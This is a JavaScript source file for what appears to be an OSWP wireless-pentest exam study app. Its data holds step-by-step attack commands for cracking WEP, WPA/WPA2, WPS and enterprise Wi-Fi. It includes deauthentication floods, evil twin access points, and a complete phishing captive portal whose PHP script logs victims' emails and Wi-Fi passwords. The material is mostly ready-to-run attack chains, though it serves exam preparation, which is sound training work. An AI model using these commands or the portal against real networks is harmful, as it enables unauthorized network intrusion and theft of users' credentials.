const { useState, useCallback, useMemo, useEffect, useRef } = window.React;

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// OSWP AUTOPILOT v1 — Decision Engine for OSWP (PEN-210) 2026
// Format: 3 Network Scenarios | Must crack 2 (1 mandatory) | 3h45m + 24h report
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

// ─── PHASE 0: SETUP & RECON ───
const SETUP_CHAIN = [
  {
    phase: "0. Interface Setup & Monitor Mode",
    desc: "Configure your wireless adapter before ANY attack. This is step zero.",
    steps: [
      { action: "Kill interfering processes", cmd: () => `sudo airmon-ng check kill\n\n# If still issues:\nsudo systemctl stop NetworkManager\nsudo systemctl stop wpa_supplicant`, check: "All interfering processes killed?", critical: true },
      { action: "Enable monitor mode", cmd: () => `# List interfaces:\nsudo airmon-ng\n\n# Enable monitor mode:\nsudo airmon-ng start wlan0\n\n# Verify:\niwconfig\n# Should show wlan0mon in Monitor mode`, check: "wlan0mon created in Monitor mode?", critical: true },
      { action: "Verify injection works", cmd: () => `sudo aireplay-ng --test wlan0mon\n\n# Should show:\n# Injection is working!`, check: "Injection is working?" },
      { action: "Change channel (if needed)", cmd: () => `# Set specific channel:\nsudo iwconfig wlan0mon channel 6\n\n# Or use airodump to lock channel:\nsudo airodump-ng wlan0mon -c 6`, check: "Locked to target channel?" },
    ]
  },
  {
    phase: "1. Network Discovery & Reconnaissance",
    desc: "Identify all wireless networks, clients, encryption types. Map the battlefield.",
    steps: [
      { action: "Scan all networks", cmd: () => `# Full scan (all channels, all bands):\nsudo airodump-ng wlan0mon\n\n# Save to file:\nsudo airodump-ng wlan0mon -w recon --output-format csv,pcap\n\n# 2.4GHz only:\nsudo airodump-ng wlan0mon --band a\n\n# 5GHz only:\nsudo airodump-ng wlan0mon --band b`, check: "Note: BSSID, ESSID, Channel, Encryption, Cipher, Auth for EVERY network", critical: true },
      { action: "Lock onto target AP", cmd: () => `# Focus on specific AP (replace values):\nsudo airodump-ng wlan0mon --bssid AA:BB:CC:DD:EE:FF -c 6 -w target_capture\n\n# This shows:\n# - Connected clients (STATION column)\n# - Data packets (for WEP)\n# - Handshakes (for WPA)`, check: "See connected clients? Note their MAC addresses!", critical: true },
      { action: "Identify encryption type", cmd: () => `# From airodump-ng output:\n# ENC column tells you encryption:\n#   OPN  = Open (no encryption)\n#   WEP  = WEP (easy to crack)\n#   WPA  = WPA/WPA2 PSK\n#   WPA2 = WPA2 PSK\n#   WPA2 WPA = Mixed mode\n#\n# CIPHER column:\n#   CCMP = AES (WPA2)\n#   TKIP = TKIP (WPA)\n#   WEP  = WEP\n#\n# AUTH column:\n#   PSK  = Pre-Shared Key\n#   MGT  = Enterprise (RADIUS)\n#   SKA  = Shared Key Auth (WEP)\n#   OPN  = Open`, check: "Which attack path? WEP→crack, WPA→handshake, Enterprise→evil twin" },
      { action: "Passive sniffing with Wireshark", cmd: () => `# Capture with Wireshark in monitor mode:\nsudo wireshark &\n# Select wlan0mon interface\n\n# Useful filters:\n# wlan.fc.type_subtype == 0x08    (Beacons)\n# wlan.fc.type_subtype == 0x04    (Probe Requests)\n# wlan.fc.type_subtype == 0x05    (Probe Responses)\n# eapol                            (WPA Handshakes)\n# wlan.bssid == AA:BB:CC:DD:EE:FF  (Filter by AP)`, check: "Capture beacons, probe requests, identify hidden SSIDs" },
    ]
  },
];

// ─── WEP CRACKING ───
const WEP_CHAIN = [
  {
    phase: "2. WEP Cracking (with Clients)",
    desc: "Connected clients generate IVs. Deauth + ARP replay = fast crack.",
    steps: [
      { action: "Capture WEP traffic", cmd: () => `# Lock onto WEP AP:\nsudo airodump-ng wlan0mon --bssid AA:BB:CC:DD:EE:FF -c 6 -w wep_capture\n\n# Watch the #Data column — need ~20,000-40,000 IVs to crack`, check: "IVs accumulating? If slow, use ARP replay", critical: true },
      { action: "Fake authentication", cmd: () => `# Associate with the AP (required for injection):\nsudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h YOUR_MAC -e "NetworkName" wlan0mon\n\n# Keep-alive fake auth:\nsudo aireplay-ng -1 6000 -o 1 -q 10 -a AA:BB:CC:DD:EE:FF -h YOUR_MAC wlan0mon\n\n# Get your MAC:\nmacchanger --show wlan0mon`, check: "Association successful? Required for injection!", critical: true },
      { action: "ARP Request Replay", cmd: () => `# Replay ARP packets to generate IVs fast:\nsudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h YOUR_MAC wlan0mon\n\n# Wait for ARP packet, then it auto-replays\n# IVs should climb FAST (thousands/min)`, check: "ARP requests being replayed? IVs climbing?", critical: true },
      { action: "Deauth client to generate ARP", cmd: () => `# If no ARP traffic, deauth a client:\nsudo aireplay-ng -0 1 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon\n\n# Client reconnects → ARP → replay captures it\n# Use -0 1 for single deauth (less suspicious)`, check: "Client reconnected? ARP traffic started?" },
      { action: "Crack WEP key", cmd: () => `# Crack while still capturing (parallel):\nsudo aircrack-ng wep_capture-01.cap\n\n# With PTW attack (faster, default):\nsudo aircrack-ng -z wep_capture-01.cap\n\n# With FMS/KoreK (if PTW fails):\nsudo aircrack-ng -K wep_capture-01.cap`, check: "KEY FOUND? Save it! Format: XX:XX:XX:XX:XX", critical: true },
      { action: "Connect with cracked key", cmd: () => `# Connect to verify:\nsudo airmon-ng stop wlan0mon\niwconfig wlan0 essid "NetworkName" key s:PASSWORD\n# Or hex key:\niwconfig wlan0 essid "NetworkName" key XX:XX:XX:XX:XX\ndhclient wlan0`, check: "Connected? Get IP? Access network?" },
    ]
  },
  {
    phase: "3. WEP Cracking — Clientless",
    desc: "No clients connected? Use ChopChop or Fragmentation to forge packets.",
    steps: [
      { action: "Fake authentication (same)", cmd: () => `sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h YOUR_MAC -e "NetworkName" wlan0mon`, check: "Association successful?", critical: true },
      { action: "ChopChop attack", cmd: () => `# Obtain PRGA (keystream):\nsudo aireplay-ng -4 -b AA:BB:CC:DD:EE:FF -h YOUR_MAC wlan0mon\n\n# Answer 'y' when asked to use the packet\n# Produces .xor file with keystream`, check: "Got .xor keystream file?", critical: true },
      { action: "Fragmentation attack (alternative)", cmd: () => `# Alternative to ChopChop:\nsudo aireplay-ng -5 -b AA:BB:CC:DD:EE:FF -h YOUR_MAC wlan0mon\n\n# Also produces .xor keystream\n# Try this if ChopChop fails`, check: "Got .xor file? One method must work" },
      { action: "Forge ARP packet", cmd: () => `# Create ARP request using keystream:\nsudo packetforge-ng -0 -a AA:BB:CC:DD:EE:FF -h YOUR_MAC -k 255.255.255.255 -l 255.255.255.255 -y fragment.xor -w forged_arp.cap\n\n# -0 = ARP packet\n# -k = destination IP\n# -l = source IP`, check: "Forged ARP packet created?", critical: true },
      { action: "Replay forged packet", cmd: () => `# Replay to generate IVs:\nsudo aireplay-ng -2 -r forged_arp.cap wlan0mon\n\n# IVs should accumulate rapidly`, check: "IVs climbing? Wait for ~20,000+" },
      { action: "Crack the key", cmd: () => `sudo aircrack-ng wep_capture-01.cap`, check: "KEY FOUND?", critical: true },
    ]
  },
];

// ─── WPA/WPA2 PSK CRACKING ───
const WPA_CHAIN = [
  {
    phase: "4. WPA/WPA2 PSK — Capture Handshake",
    desc: "Capture the 4-way EAPOL handshake, then crack offline. The core OSWP attack.",
    steps: [
      { action: "Start targeted capture", cmd: () => `# Lock onto WPA AP and capture:\nsudo airodump-ng wlan0mon --bssid AA:BB:CC:DD:EE:FF -c 6 -w wpa_capture\n\n# Watch top-right corner for:\n# "WPA handshake: AA:BB:CC:DD:EE:FF"`, check: "Capturing on correct channel? Clients visible?", critical: true },
      { action: "Deauth to force handshake", cmd: () => `# Deauth a connected client (in NEW terminal):\nsudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon\n\n# Deauth ALL clients:\nsudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon\n\n# Broadcast deauth (less reliable):\nsudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon\n\n# IMPORTANT: Keep airodump running in other terminal!`, check: "WPA handshake captured? Check airodump header!", critical: true },
      { action: "Verify handshake in capture", cmd: () => `# Verify the capture file has the handshake:\nsudo aircrack-ng wpa_capture-01.cap\n# Should show: "1 handshake" next to the network\n\n# Or with Wireshark:\n# Filter: eapol\n# Should see 4 EAPOL frames (Message 1-4)\n# Minimum: Messages 1 & 2, or 2 & 3`, check: "Handshake confirmed in file? At least M1+M2 or M2+M3", critical: true },
      { action: "Alternative: PMKID attack", cmd: () => `# Some APs leak PMKID in first EAPOL message\n# No client needed!\n\n# Capture with hcxdumptool:\nsudo hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng\n\n# Convert for hashcat:\nhcxpcapngtool -o pmkid_hash.hc22000 pmkid.pcapng\n\n# Crack with hashcat:\nhashcat -m 22000 pmkid_hash.hc22000 /usr/share/wordlists/rockyou.txt`, check: "PMKID captured? No client deauth needed!" },
    ]
  },
  {
    phase: "5. WPA/WPA2 PSK — Crack the Key",
    desc: "Offline dictionary attack on the captured handshake. Wordlist is everything.",
    steps: [
      { action: "Crack with aircrack-ng", cmd: () => `# Standard dictionary attack:\nsudo aircrack-ng wpa_capture-01.cap -w /usr/share/wordlists/rockyou.txt\n\n# With specific BSSID:\nsudo aircrack-ng wpa_capture-01.cap -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF`, check: "KEY FOUND? If not, try more wordlists!", critical: true },
      { action: "Crack with hashcat (GPU)", cmd: () => `# Convert cap to hashcat format:\nhcxpcapngtool -o wpa_hash.hc22000 wpa_capture-01.cap\n\n# Or legacy:\naircrack-ng wpa_capture-01.cap -j wpa_hash\n\n# Crack with hashcat:\nhashcat -m 22000 wpa_hash.hc22000 /usr/share/wordlists/rockyou.txt\n\n# With rules:\nhashcat -m 22000 wpa_hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule`, check: "GPU cracking = much faster than aircrack-ng", critical: true },
      { action: "Crack with John the Ripper", cmd: () => `# Convert:\nsudo aircrack-ng wpa_capture-01.cap -J wpa_john\n\n# Or with hcxpcapngtool:\nhcxpcapngtool -o wpa_john.hc22000 wpa_capture-01.cap\n\n# Crack:\njohn --wordlist=/usr/share/wordlists/rockyou.txt wpa_john.hccap\njohn --wordlist=/usr/share/wordlists/rockyou.txt --rules wpa_john.hccap`, check: "Try John if aircrack takes too long" },
      { action: "Crack with coWPAtty", cmd: () => `# Dictionary attack:\ncowpatty -f /usr/share/wordlists/rockyou.txt -r wpa_capture-01.cap -s "NetworkName"\n\n# Rainbow table (pre-computed PMKs):\ngenpmk -f /usr/share/wordlists/rockyou.txt -d pmk_table -s "NetworkName"\ncowpatty -d pmk_table -r wpa_capture-01.cap -s "NetworkName"`, check: "coWPAtty with rainbow tables = very fast" },
      { action: "Custom wordlist generation", cmd: () => `# CeWL from related website:\ncewl http://company-site.com -d 3 -m 4 -w custom.txt\n\n# Crunch — generate patterns:\ncrunch 8 12 -t @@@@%%%% -o patterns.txt\ncrunch 8 8 0123456789 -o numeric8.txt\n\n# Common Wi-Fi password patterns:\n# CompanyName + digits: Corp2025, Corp123\n# Phone numbers: 10 digits\n# Simple: password1, qwerty123\n# Address: 123MainSt\n\n# Combine wordlists:\ncat /usr/share/wordlists/rockyou.txt custom.txt | sort -u > combined.txt`, check: "Build context-specific wordlists for the target!" },
      { action: "Connect with cracked PSK", cmd: () => `# Stop monitor mode:\nsudo airmon-ng stop wlan0mon\n\n# Create wpa_supplicant config:\nwpa_passphrase "NetworkName" "CrackedPassword" > /tmp/wpa.conf\n\n# Connect:\nsudo wpa_supplicant -B -i wlan0 -c /tmp/wpa.conf\nsudo dhclient wlan0\n\n# Verify:\niwconfig wlan0\nip a show wlan0\nping -c 2 8.8.8.8`, check: "Connected and got IP? Capture proof!", critical: true },
    ]
  },
];

// ─── ROGUE AP & EVIL TWIN ───
const ROGUE_AP_CHAIN = [
  {
    phase: "6. Evil Twin — Hostapd Rogue AP",
    desc: "Create a fake AP that mirrors the target. Clients connect to you → capture creds.",
    steps: [
      { action: "Create hostapd config", cmd: () => `# Create config file:\ncat > /tmp/evil_twin.conf << 'EOF'\ninterface=wlan0mon\ndriver=nl80211\nssid=TargetNetworkName\nhw_mode=g\nchannel=6\nwmm_enabled=0\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\n\n# For Open network:\n# (no additional config needed)\n\n# For WPA2:\n#wpa=2\n#wpa_passphrase=evilpassword\n#wpa_key_mgmt=WPA-PSK\n#rsn_pairwise=CCMP\nEOF`, check: "Config created? Match SSID and channel exactly!", critical: true },
      { action: "Start rogue AP", cmd: () => `# Start the evil twin:\nsudo hostapd /tmp/evil_twin.conf\n\n# If error about interface, try:\nsudo airmon-ng stop wlan0mon\nsudo hostapd /tmp/evil_twin.conf`, check: "AP broadcasting? Visible to clients?", critical: true },
      { action: "Set up DHCP for clients", cmd: () => `# Configure IP on AP interface:\nsudo ifconfig wlan0mon 10.0.0.1 netmask 255.255.255.0 up\n\n# dnsmasq config:\ncat > /tmp/dnsmasq.conf << 'EOF'\ninterface=wlan0mon\ndhcp-range=10.0.0.10,10.0.0.50,255.255.255.0,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\nserver=8.8.8.8\nlog-queries\nlog-dhcp\naddress=/#/10.0.0.1\nEOF\n\nsudo dnsmasq -C /tmp/dnsmasq.conf\n\n# Enable routing:\nsudo sysctl -w net.ipv4.ip_forward=1\nsudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE`, check: "DHCP server running? Clients getting IPs?" },
      { action: "Deauth clients from real AP", cmd: () => `# In another terminal, deauth clients from REAL AP:\n# They will reconnect to YOUR evil twin\nsudo aireplay-ng -0 0 -a REAL_AP_BSSID wlan0mon\n\n# Targeted deauth:\nsudo aireplay-ng -0 0 -a REAL_AP_BSSID -c CLIENT_MAC wlan0mon\n\n# Note: You may need a SECOND wireless adapter\n# One for the rogue AP, one for deauth`, check: "Clients connecting to your AP?", critical: true },
      { action: "Capture credentials", cmd: () => `# Monitor connections:\nsudo tail -f /var/log/syslog | grep dnsmasq\n\n# Capture all traffic from clients:\nsudo tcpdump -i wlan0mon -w evil_twin_capture.pcap\n\n# Look for cleartext creds:\nsudo tcpdump -i wlan0mon -A | grep -iE '(user|pass|login|credential)'`, check: "Credentials captured? HTTP traffic?" },
    ]
  },
  {
    phase: "7. Captive Portal Attack",
    desc: "Serve a fake login page to harvest Wi-Fi passwords from victims.",
    steps: [
      { action: "Set up web server", cmd: () => `# Create captive portal page:\nmkdir -p /tmp/portal\ncat > /tmp/portal/index.html << 'HTMLEOF'\n<!DOCTYPE html>\n<html><head><title>Wi-Fi Login Required</title>\n<style>body{font-family:Arial;background:#1a1a2e;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}\n.box{background:#16213e;padding:40px;border-radius:10px;width:350px;box-shadow:0 0 20px rgba(0,0,0,0.5)}\nh2{text-align:center;margin-bottom:20px}input{width:100%;padding:10px;margin:8px 0;border:1px solid #333;border-radius:5px;background:#0f3460;color:#fff;box-sizing:border-box}\nbutton{width:100%;padding:12px;background:#e94560;color:#fff;border:none;border-radius:5px;cursor:pointer;font-size:16px;margin-top:10px}</style></head>\n<body><div class="box"><h2>🔒 Network Login</h2><form method="POST" action="/login">\n<input name="email" placeholder="Email" required>\n<input name="password" type="password" placeholder="Wi-Fi Password" required>\n<button type="submit">Connect</button></form></div></body></html>\nHTMLEOF\n\n# Start web server with PHP (captures creds):\ncat > /tmp/portal/login.php << 'PHPEOF'\n<?php\n$f = fopen("/tmp/captured_creds.txt", "a");\nfwrite($f, date("Y-m-d H:i:s") . " | " . $_POST["email"] . " | " . $_POST["password"] . "\\n");\nfclose($f);\nheader("Location: http://10.0.0.1/");\n?>\nPHPEOF\n\nsudo php -S 10.0.0.1:80 -t /tmp/portal/`, check: "Web server running on port 80?" },
      { action: "DNS redirect all to portal", cmd: () => `# Already configured in dnsmasq with:\n# address=/#/10.0.0.1\n# This redirects ALL DNS queries to our IP\n\n# iptables redirect HTTP to portal:\nsudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80\nsudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1:80`, check: "All traffic redirecting to portal?" },
      { action: "Monitor captured credentials", cmd: () => `# Watch for incoming creds:\ntail -f /tmp/captured_creds.txt\n\n# Check web server logs too:\n# PHP server outputs requests to terminal`, check: "Passwords coming in? Try them against the real AP!", critical: true },
    ]
  },
];

// ─── WPA ENTERPRISE ───
const ENTERPRISE_CHAIN = [
  {
    phase: "8. WPA Enterprise — Evil Twin with RADIUS",
    desc: "Fake RADIUS server to capture enterprise credentials (EAP handshakes).",
    steps: [
      { action: "Identify Enterprise network", cmd: () => `# In airodump-ng, look for:\n# AUTH = MGT (Management/Enterprise)\n# This means WPA-Enterprise with RADIUS\n\n# Note the ESSID, BSSID, and channel\n# Clients use username/password (not PSK)`, check: "AUTH=MGT confirms WPA Enterprise", critical: true },
      { action: "Set up FreeRADIUS evil twin", cmd: () => `# Install if needed:\nsudo apt install freeradius hostapd-wpe\n\n# ─── Option A: hostapd-wpe (easier) ───\n# Edit config:\nsudo nano /etc/hostapd-wpe/hostapd-wpe.conf\n# Set:\n# interface=wlan0\n# ssid=TargetCorpWifi\n# channel=6\n\n# Start:\nsudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf\n\n# ─── Option B: hostapd-mana ───\n# Similar setup, more flexible\nsudo hostapd-mana /etc/hostapd-mana/mana.conf`, check: "hostapd-wpe running? Broadcasting enterprise SSID?", critical: true },
      { action: "Capture EAP credentials", cmd: () => `# hostapd-wpe automatically captures:\n# - MS-CHAPv2 challenge/response\n# - PEAP credentials\n# - EAP-TTLS credentials\n\n# Output looks like:\n# username: john.doe\n# challenge: xx:xx:xx:xx:xx:xx:xx:xx\n# response: yy:yy:yy:yy:yy:...\n\n# Look in hostapd-wpe output or:\ncat /tmp/hostapd-wpe.log`, check: "EAP identity and challenge/response captured?", critical: true },
      { action: "Crack captured hashes", cmd: () => `# Convert to hashcat format (NetNTLMv1):\n# user::::response:challenge\n\n# Crack with hashcat:\nhashcat -m 5500 enterprise_hash.txt /usr/share/wordlists/rockyou.txt\n\n# Or with asleap:\nasleap -C CHALLENGE -R RESPONSE -W /usr/share/wordlists/rockyou.txt\n\n# Or John:\njohn --wordlist=/usr/share/wordlists/rockyou.txt enterprise_hash.txt`, check: "Password cracked? Connect to real network!", critical: true },
      { action: "Connect to real Enterprise network", cmd: () => `cat > /tmp/wpa_enterprise.conf << 'EOF'\nnetwork={\n  ssid="CorpWifi"\n  key_mgmt=WPA-EAP\n  eap=PEAP\n  identity="john.doe"\n  password="CrackedPassword"\n  phase2="auth=MSCHAPV2"\n}\nEOF\n\nsudo wpa_supplicant -B -i wlan0 -c /tmp/wpa_enterprise.conf\nsudo dhclient wlan0`, check: "Connected to enterprise network with cracked creds?" },
    ]
  },
];

// ─── WPS ATTACKS ───
const WPS_CHAIN = [
  {
    phase: "9. WPS PIN Attacks",
    desc: "Wi-Fi Protected Setup has a design flaw — brute-force the 8-digit PIN.",
    steps: [
      { action: "Detect WPS-enabled APs", cmd: () => `# Scan for WPS:\nsudo wash -i wlan0mon\n\n# Or with airodump:\nsudo airodump-ng wlan0mon --wps\n\n# Look for:\n# Locked = No (WPS not rate-limited)\n# Version 1.0 (most vulnerable)`, check: "WPS enabled? Not locked? This is your easy win!", critical: true },
      { action: "Reaver PIN brute-force", cmd: () => `# Brute-force WPS PIN:\nsudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv\n\n# With delay (avoid lockout):\nsudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv -d 2 -t 5\n\n# Fixed PIN attempt:\nsudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv -p 12345670\n\n# Pixie Dust attack (MUCH faster):\nsudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv -K 1`, check: "PIN found? WPA PSK revealed!", critical: true },
      { action: "Bully (alternative to Reaver)", cmd: () => `# Alternative WPS brute-force:\nsudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -v 3\n\n# Pixie Dust with Bully:\nsudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -d -v 3`, check: "Try Bully if Reaver fails" },
      { action: "Connect with recovered PSK", cmd: () => `# Reaver outputs the WPA PSK\n# Connect normally:\nsudo airmon-ng stop wlan0mon\nwpa_passphrase "NetworkName" "RecoveredPSK" > /tmp/wps_connect.conf\nsudo wpa_supplicant -B -i wlan0 -c /tmp/wps_connect.conf\nsudo dhclient wlan0`, check: "Connected via recovered WPA key?" },
    ]
  },
];

// ─── ADDITIONAL ATTACK TECHNIQUES ───
const EXTRA_ATTACKS = [
  {
    phase: "10. MAC Filtering Bypass",
    desc: "If AP uses MAC whitelist, spoof an allowed client's MAC to bypass.",
    steps: [
      { action: "Find allowed MACs", cmd: () => `# Sniff traffic to find connected client MACs:\nsudo airodump-ng wlan0mon --bssid AA:BB:CC:DD:EE:FF -c 6\n\n# Note STATION column — these MACs are whitelisted`, check: "Client MACs visible in STATION column?", critical: true },
      { action: "Spoof MAC address", cmd: () => `# Stop monitor mode:\nsudo airmon-ng stop wlan0mon\n\n# Change MAC:\nsudo ifconfig wlan0 down\nsudo macchanger -m CLIENT_MAC wlan0\nsudo ifconfig wlan0 up\n\n# Verify:\nmacchanger --show wlan0\n\n# Re-enable monitor mode:\nsudo airmon-ng start wlan0`, check: "MAC changed? Now you're 'whitelisted'" },
    ]
  },
  {
    phase: "11. Hidden SSID Discovery",
    desc: "Hidden networks still broadcast beacons — reveal the SSID easily.",
    steps: [
      { action: "Detect hidden networks", cmd: () => `# In airodump-ng, hidden SSIDs show as:\n# <length: X>  or blank ESSID\n# But BSSID is still visible\n\nsudo airodump-ng wlan0mon\n# Look for entries with blank/hidden ESSID`, check: "Hidden SSID detected?", critical: true },
      { action: "Reveal SSID via deauth", cmd: () => `# Deauth a client — their probe request reveals SSID:\nsudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon\n\n# Watch airodump — SSID appears when client reconnects\n\n# Or passively wait for probe requests`, check: "SSID revealed in airodump-ng?" },
    ]
  },
  {
    phase: "12. Aireplay-ng Advanced Injection",
    desc: "Various injection attacks for specific scenarios.",
    steps: [
      { action: "Interactive packet replay", cmd: () => `# Select and replay specific packets:\nsudo aireplay-ng -2 -b AA:BB:CC:DD:EE:FF -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 wlan0mon\n\n# -f 1 = FromDS bit set\n# -m 68 = minimum packet size\n# -n 86 = maximum packet size`, check: "Custom packet injection needed?" },
      { action: "Korek ChopChop details", cmd: () => `# Decrypt one packet without the key:\nsudo aireplay-ng -4 -b AA:BB:CC:DD:EE:FF -h YOUR_MAC wlan0mon\n\n# Output: .cap with decrypted packet + .xor with keystream\n# Use keystream to forge new packets`, check: "Decrypted packet obtained?" },
      { action: "Cafe-latte attack", cmd: () => `# Attack WEP client WITHOUT the AP being in range:\nsudo aireplay-ng -6 -b FAKE_BSSID -h YOUR_MAC -D wlan0mon\n\n# Captures IVs from client gratuitous ARPs`, check: "Attacking isolated WEP client?" },
    ]
  },
];

// ─── EXAM CHECKLIST ───
const CHECKLIST = {
  "Network Scenario 1 (Mandatory)": [
    "Identified network type (WEP/WPA/WPA2/Enterprise)",
    "Encryption and auth method documented",
    "Attack vector selected and executed",
    "Key/password cracked",
    "Connected to network successfully",
    "Proof of access captured (screenshot)",
    "All commands documented with output",
  ],
  "Network Scenario 2": [
    "Identified network type (WEP/WPA/WPA2/Enterprise)",
    "Encryption and auth method documented",
    "Attack vector selected and executed",
    "Key/password cracked",
    "Connected to network successfully",
    "Proof of access captured (screenshot)",
    "All commands documented with output",
  ],
  "Network Scenario 3 (Backup/Extra)": [
    "Identified network type (WEP/WPA/WPA2/Enterprise)",
    "Encryption and auth method documented",
    "Attack vector selected and executed",
    "Key/password cracked",
    "Connected to network successfully",
    "Proof of access captured (screenshot)",
    "All commands documented with output",
  ],
  "Report & Submission": [
    "Report covers at least 2 cracked networks",
    "Each step has: command + output + screenshot",
    "Network reconnaissance section included",
    "Attack methodology clearly explained",
    "Proof screenshots show successful connection",
    "Report is in PDF format",
    "Submitted within 24 hours after exam",
  ],
};

// ─── EXAM TIMELINE ───
const MILESTONES = [
  { hour: 0, label: "START — Kill processes, enable monitor mode, scan ALL networks." },
  { hour: 0.25, label: "All networks identified. Note encryption types. Pick mandatory first." },
  { hour: 0.5, label: "Attack on Network 1 (mandatory) should be underway." },
  { hour: 1.0, label: "Network 1 should be cracked or nearly cracked by now." },
  { hour: 1.5, label: "TARGET: Network 1 DONE. Start Network 2." },
  { hour: 2.0, label: "Network 2 attack in progress. If stuck, try Network 3 instead." },
  { hour: 2.5, label: "Network 2 should be cracked. You need 2 of 3 to pass." },
  { hour: 3.0, label: "Both networks done? Attack Network 3 for extra credit. Document everything." },
  { hour: 3.5, label: "FINAL 15min — Verify all screenshots and proof are captured." },
  { hour: 3.75, label: "EXAM ENDS — Begin writing report (24h deadline)." },
];

// ─── QUICK REFERENCE COMMANDS ───
const QUICK_REF = {
  "Monitor Mode": [
    { l: "Start monitor", c: "sudo airmon-ng start wlan0" },
    { l: "Stop monitor", c: "sudo airmon-ng stop wlan0mon" },
    { l: "Kill interfering", c: "sudo airmon-ng check kill" },
    { l: "Check interfaces", c: "iwconfig" },
  ],
  "Scanning": [
    { l: "Scan all networks", c: "sudo airodump-ng wlan0mon" },
    { l: "Target specific AP", c: "sudo airodump-ng wlan0mon --bssid BSSID -c CH -w capture" },
    { l: "WPS scan", c: "sudo wash -i wlan0mon" },
    { l: "Scan + save", c: "sudo airodump-ng wlan0mon -w scan --output-format csv,pcap" },
  ],
  "Deauthentication": [
    { l: "Deauth client", c: "sudo aireplay-ng -0 5 -a AP_BSSID -c CLIENT_MAC wlan0mon" },
    { l: "Deauth all", c: "sudo aireplay-ng -0 5 -a AP_BSSID wlan0mon" },
    { l: "Continuous deauth", c: "sudo aireplay-ng -0 0 -a AP_BSSID wlan0mon" },
  ],
  "WEP Attacks": [
    { l: "Fake auth", c: "sudo aireplay-ng -1 0 -a BSSID -h YOUR_MAC wlan0mon" },
    { l: "ARP replay", c: "sudo aireplay-ng -3 -b BSSID -h YOUR_MAC wlan0mon" },
    { l: "ChopChop", c: "sudo aireplay-ng -4 -b BSSID -h YOUR_MAC wlan0mon" },
    { l: "Fragmentation", c: "sudo aireplay-ng -5 -b BSSID -h YOUR_MAC wlan0mon" },
    { l: "Forge ARP", c: "sudo packetforge-ng -0 -a BSSID -h YOUR_MAC -k 255.255.255.255 -l 255.255.255.255 -y frag.xor -w arp.cap" },
    { l: "Crack WEP", c: "sudo aircrack-ng capture.cap" },
  ],
  "WPA/WPA2 Attacks": [
    { l: "Crack handshake", c: "sudo aircrack-ng capture.cap -w /usr/share/wordlists/rockyou.txt" },
    { l: "Hashcat WPA", c: "hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt" },
    { l: "coWPAtty", c: "cowpatty -f wordlist.txt -r capture.cap -s ESSID" },
    { l: "Convert to hashcat", c: "hcxpcapngtool -o hash.hc22000 capture.cap" },
  ],
  "MAC & Identity": [
    { l: "Show MAC", c: "macchanger --show wlan0" },
    { l: "Random MAC", c: "sudo macchanger -r wlan0" },
    { l: "Set specific MAC", c: "sudo macchanger -m XX:XX:XX:XX:XX:XX wlan0" },
    { l: "Restore MAC", c: "sudo macchanger -p wlan0" },
  ],
  "Connection": [
    { l: "WPA connect", c: 'wpa_passphrase "SSID" "password" > wpa.conf && sudo wpa_supplicant -B -i wlan0 -c wpa.conf && sudo dhclient wlan0' },
    { l: "WEP connect", c: 'iwconfig wlan0 essid "SSID" key s:PASSWORD && dhclient wlan0' },
    { l: "Check connection", c: "iwconfig wlan0 && ip a show wlan0" },
  ],
};

// ━━━ CSS ━━━
const CSS = `
@import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=Outfit:wght@400;500;600;700;800;900&display=swap');
:root{--b0:#06080b;--b1:#0b0e13;--b2:#111519;--b3:#191e26;--b4:#222831;--bd:#272e38;--bd2:#333c4a;--t0:#f3f5f7;--t1:#b3bcc8;--t2:#6c7585;--ac:#06b6d4;--acd:rgba(6,182,212,0.1);--g:#22c55e;--gd:rgba(34,197,94,0.08);--r:#ef4444;--rd:rgba(239,68,68,0.08);--y:#eab308;--b:#3b82f6;--cg:#6ee7b7;--m:'IBM Plex Mono',monospace;--s:'Outfit',system-ui,sans-serif}
*{margin:0;padding:0;box-sizing:border-box}body{background:var(--b0);color:var(--t1);font-family:var(--s)}
.app{min-height:100vh;display:flex;flex-direction:column}
.hdr{background:var(--b1);border-bottom:1px solid var(--bd);padding:12px 16px;display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap}
.logo{font-family:var(--s);font-weight:900;font-size:18px;letter-spacing:-0.5px;background:linear-gradient(135deg,#06b6d4,#3b82f6,#8b5cf6);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.logo-sub{font-size:9px;color:var(--t2);letter-spacing:3px;text-transform:uppercase;font-weight:500}
.tabs{display:flex;background:var(--b1);border-bottom:1px solid var(--bd);overflow-x:auto;padding:0 8px;gap:1px}
